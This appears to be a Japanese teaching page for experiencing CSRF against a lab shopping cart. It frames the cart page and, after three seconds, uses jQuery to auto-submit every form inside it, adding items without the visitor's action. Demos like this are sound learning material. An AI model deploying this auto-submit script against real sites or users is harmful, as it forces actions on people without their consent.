<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>CSRF</title>
  <script src="//code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>

</head>
<body>
	<h1>csrf体験</h1>
	<p>
    CSRFを体験してみましょう。
    勝手にカートに商品が追加されます。
    <a href="cart.php">カートへ移動</a>
	</p>

  <!-- 現在のHTMLページに他ページの内容を埋め込む-->
  <iframe 
    id="csrf" 
    src="index.php">
  </iframe>

  <script>
    // ３秒後に実行
    setTimeout(function(){
      // (テキストを取得).contents.(タグで囲む) find('form')…formタグを検出する
      // each()…繰り返し処理させる $(this)…$(this)を囲っているイベントの発生要素を取得
      $('#csrf').contents().find('form').each(function(){
        // $(this)…$(this)を囲っているイベントの発生要素を取得 
        // submit()…$('#csrf')にボタンを指定し、$(this)にフォームを指定して、ボタンを自動で押す
        $(this).submit();
      });
      
      alert('カートに商品を登録しました。');
    }, 3000);
      
  </script>
</body>
</html>
